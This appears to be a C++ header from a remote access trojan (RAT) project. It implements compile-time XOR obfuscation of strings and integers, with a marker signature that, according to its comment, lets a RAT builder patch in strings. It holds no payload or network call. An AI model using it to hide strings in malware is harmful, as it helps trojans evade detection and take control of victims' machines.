#pragma once

// 异或密钥
constexpr char key[] = "OBFKEY\x00\x00\x00\x00\x00\x00\x00\x00";

constexpr void XorData(char* src, char* dest, size_t len) {
    size_t keyIndex = 6;
    for (size_t i = 0; i < len; i++) {
        dest[i] = src[i] ^ key[keyIndex];
        keyIndex++;
        if (keyIndex == sizeof(key) - 1) {
            keyIndex = 6;
        }
    }
}

template <size_t size>
class Obfuscator {
public:
    char sig[6]; // 定位特征, 用于生成 RAT 时替换字符串
    char obfStr[size]; // 字符串密文

    // 编译时加密存储密文
    constexpr Obfuscator(char* str) : sig{ 'O', 'B', 'F', 'S', 'I', 'G' }, obfStr{} {
        XorData(str, obfStr, size);
    }

    // 运行时解密至栈中
    char* Decrypt() {
        XorData(obfStr, obfStr, size);
        return obfStr;
    }
};

#define OBFSTR(str) []{ constexpr Obfuscator<sizeof(str)> obf(str); return obf; }().Decrypt()

#define INTSTR(num) (char[5]) { (char)(num & 0xFF), (char)((num >> 8) & 0xFF), (char)((num >> 16) & 0xFF), (char)((num >> 24) & 0xFF), '\0' }

#define OBFINT(num) *(int*)OBFSTR(INTSTR(num))